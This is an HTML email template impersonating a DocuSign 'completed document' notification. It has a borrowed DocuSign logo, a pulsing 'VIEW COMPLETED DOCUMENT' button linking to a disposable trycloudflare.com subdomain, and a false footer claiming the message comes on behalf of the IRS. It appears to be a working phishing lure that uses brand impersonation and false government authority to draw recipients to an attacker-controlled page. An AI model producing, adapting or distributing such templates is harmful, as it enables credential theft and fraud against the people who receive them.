<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>DocuSign Notification</title>
    <style>
      @keyframes pulse {
        0% { box-shadow: 0 0 0 0 rgba(0,112,210, 0.4); }
        70% { box-shadow: 0 0 0 10px rgba(0,112,210, 0); }
        100% { box-shadow: 0 0 0 0 rgba(0,112,210, 0); }
      }
      .pulse-button {
        background-color: #0070d2;
        color: white;
        padding: 12px 24px;
        text-decoration: none;
        border-radius: 5px;
        font-weight: bold;
        display: inline-block;
        animation: pulse 2s infinite;
      }
      .icon {
        width: 40px;
        vertical-align: middle;
        margin-right: 10px;
      }
    </style>
  </head>
  <body style="font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px;">
    <table width="100%" style="max-width: 600px; margin: auto; background-color: white; border: 1px solid #ddd; padding: 20px;">
      <tr>
        <td align="center">
          <img src="https://www.nvidia.com/en-eu/customer-stories/docusign-accelerates-agreement-management-with-inference-platform/_jcr_content/root/responsivegrid/nv_container_copy_co_1468216957/nv_container_1033748/nv_image_copy.coreimg.jpeg/1725439986837/docusign-logo-ari.jpeg" alt="DocuSign Logo" width="140">
        </td>
      </tr>
      <tr>
        <td style="padding-top: 20px;">
          <p style="color: #333; font-size: 16px;">
            <img class="icon" src="https://cdn-icons-png.flaticon.com/512/2936/2936639.png" alt="Document Icon">
            Your completed document is now available. Use the button below to review and confirm the details. <strong></strong>.
          </p>
          <p style="color: #666; font-size: 15px;"></p>
          <div style="text-align: center; margin: 30px 0;">
            <a href="https://gui-ya-innovative-appreciation.trycloudflare.com" class="pulse-button">VIEW COMPLETED DOCUMENT</a>
          </div>
          <p style="font-size: 12px; color: #aaa;">
            DocuSign is the most secure and widely used eSignature solution. This message was sent to you on behalf of the IRS.
          </p>
        </td>
      </tr>
    </table>
  </body>
</html>
